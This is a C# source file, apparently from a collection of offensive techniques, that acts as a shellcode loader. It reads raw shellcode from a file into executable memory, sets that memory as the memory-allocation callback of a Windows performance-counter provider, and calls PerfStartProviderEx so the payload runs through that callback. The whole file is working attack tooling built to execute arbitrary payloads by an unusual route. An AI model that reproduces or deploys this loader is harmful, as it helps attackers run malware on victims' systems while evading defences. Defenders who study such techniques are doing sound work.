// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PerfStartProviderEx
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: PerfStartProviderEx.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            Guid ProviderGuid = Guid.NewGuid();

            PERF_PROVIDER_CONTEXT sPPC = new PERF_PROVIDER_CONTEXT();
            sPPC.MemAllocRoutine = hAlloc;
            sPPC.ContextSize = (uint)Marshal.SizeOf(sPPC);

            IntPtr hProvider = IntPtr.Zero;
            PerfStartProviderEx(ref ProviderGuid, ref sPPC, out hProvider);

            //Close provider handle
            PerfStopProvider(hProvider);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("advapi32.dll")]
        static extern ulong PerfStartProviderEx(
             ref Guid ProviderGuid,
             ref PERF_PROVIDER_CONTEXT ProviderContext,
             out IntPtr hProvider);

        [DllImport("advapi32.dll")]
        static extern ulong PerfStopProvider(IntPtr hProvider);

        struct PERF_PROVIDER_CONTEXT
        {
            public uint ContextSize;
            public uint Reserved;
            public IntPtr ControlCallback;
            public IntPtr MemAllocRoutine;
            public IntPtr MemFreeRoutine;
            public IntPtr pMemContext;
        }

    }
}
